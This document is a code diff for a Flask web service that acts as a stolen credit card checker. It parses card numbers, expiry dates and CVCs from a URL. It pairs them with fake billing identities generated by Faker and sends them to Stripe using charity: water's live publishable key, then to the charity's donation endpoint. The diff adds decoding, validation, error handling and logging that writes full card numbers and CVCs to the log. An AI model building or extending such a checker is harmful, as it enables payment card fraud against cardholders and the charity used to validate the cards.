@@ -4,6 +4,12 @@ import threading
 from queue import Queue
 import re
 from faker import Faker
+import urllib.parse
+import logging
+
+# Set up logging
+logging.basicConfig(level=logging.DEBUG)
+logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
 faker = Faker()
@@ -56,12 +62,20 @@ def process_task():
         url, headers, data = task_queue.get()
         if url == 'exit':
             break
-        response = requests.post(url, headers=headers, data=data)
-        responses[url] = {
-            'status_code': response.status_code,
-            'content': response.text,
-            'json': response.json() if response.headers.get('content-type', '').startswith('application/json') else None
-        }
+        try:
+            response = requests.post(url, headers=headers, data=data)
+            responses[url] = {
+                'status_code': response.status_code,
+                'content': response.text,
+                'json': response.json() if response.headers.get('content-type', '').startswith('application/json') else None
+            }
+        except Exception as e:
+            logger.error(f"Error processing task for {url}: {str(e)}")
+            responses[url] = {
+                'status_code': 500,
+                'content': str(e),
+                'json': None
+            }
         task_queue.task_done()
 
 # Start multiple threads to handle tasks
@@ -71,6 +85,10 @@ for _ in range(num_threads):
 
 def parse_cc_details(cc_input):
     """Parse credit card input in various formats."""
+    # Decode URL-encoded input (e.g., %7C to |)
+    cc_input = urllib.parse.unquote(cc_input)
+    logger.debug(f"Decoded CC input: {cc_input}")
+    
     # Remove any spaces or special characters
     cc_input = re.sub(r'\s+', '', cc_input)
     
@@ -91,12 +109,21 @@ def parse_cc_details(cc_input):
     if len(exp_year) == 2:
         exp_year = f'20{exp_year}'
     
+    # Validate card number (basic length check)
+    if not (13 <= len(card_number) <= 19 and card_number.isdigit()):
+        logger.error(f"Invalid card number: {card_number}")
+        raise ValueError("Invalid card number")
+    
+    logger.debug(f"Parsed CC: number={card_number}, exp_month={exp_month}, exp_year={exp_year}, cvc={cvc}")
     return card_number, exp_month, exp_year, cvc
 
-@app.route('/cc=<cc>', methods=['GET', 'POST'])
+@app.route('/cc=<path:cc>', methods=['GET', 'POST'])
 def handle_payment(cc):
     try:
-        print(f"Received request for CC: {cc}")
+        logger.info(f"Received request for CC: {cc}")
+        
+        # Parse credit card details
+        card_number, exp_month, exp_year, cvc = parse_cc_details(cc)
         
         # Generate fake personal information
         fake_name = faker.name()
@@ -104,18 +131,17 @@ def handle_payment(cc):
         fake_email = faker.email()
         fake_postal_code = faker.postcode()
         
-        # Parse credit card details
-        card_number, exp_month, exp_year, cvc = parse_cc_details(cc)
-        
         # Format data1 with fake data and parsed credit card details
         formatted_data1 = f'type=card&billing_details[address][postal_code]={fake_postal_code}&billing_details[address][city]=&billing_details[address][country]=US&billing_details[address][line1]=&billing_details[email]={fake_email}&billing_details[name]={fake_name.replace(" ", "+")}&card[number]={card_number}&card[cvc]={cvc}&card[exp_month]={exp_month}&card[exp_year]={exp_year}&guid=131456de-f3eb-4cda-ae67-c5d2a523334de8534e&muid=72bcddaf-a5ec-4fcd-a4b2-4a50f3c944553d0a86&sid=ee25a7a4-84e5-46a9-9032-1bb65cd91f65d45f57&payment_user_agent=stripe.js%2Fe7a746c3ca%3B+stripe-js-v3%2Fe7a746c3ca%3B+card-element&referrer=https%3A%2F%2Fwww.charitywater.org&time_on_page=81662&client_attribution_metadata[client_session_id]=ed158115-44d1-4c38-9ea1-e02cff65b3ef&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU'
         
         # First request to Stripe
         url1 = 'https://api.stripe.com/v1/payment_methods'
+        logger.debug(f"Sending Stripe request with data: {formatted_data1}")
         r1 = requests.post(url1, headers=headers1, data=formatted_data1)
         
         # Check if Stripe request was successful
         if r1.status_code != 200:
+            logger.error(f"Stripe request failed: {r1.status_code} - {r1.text}")
             return jsonify({
                 'status': 'error',
                 'message': 'Failed to process payment with Stripe',
@@ -127,6 +153,7 @@ def handle_payment(cc):
         payment_method_id = stripe_response.get('id')
         
         if not payment_method_id:
+            logger.error(f"No payment method ID in Stripe response: {stripe_response}")
             return jsonify({
                 'status': 'error',
                 'message': 'No payment method ID returned from Stripe',
@@ -138,6 +165,7 @@ def handle_payment(cc):
         
         # Second request to Charity Water
         url2 = 'https://www.charitywater.org/donate/stripe'
+        logger.debug(f"Sending Charity Water request with data: {data2}")
         task_queue.put((url2, headers2, data2))
         
         # Wait for the task to be processed
@@ -166,9 +194,18 @@ def handle_payment(cc):
         # Clean up responses
         responses.pop(url2, None)
         
+        logger.info("Payment processed successfully")
         return jsonify(response_data), 200
         
+    except ValueError as ve:
+        logger.error(f"ValueError: {str(ve)}")
+        return jsonify({
+            'status': 'error',
+            'message': str(ve),
+            'data': {}
+        }), 400
     except Exception as e:
+        logger.error(f"Unexpected error: {str(e)}")
         return jsonify({
             'status': 'error',
             'message': f'Error processing payment: {str(e)}',
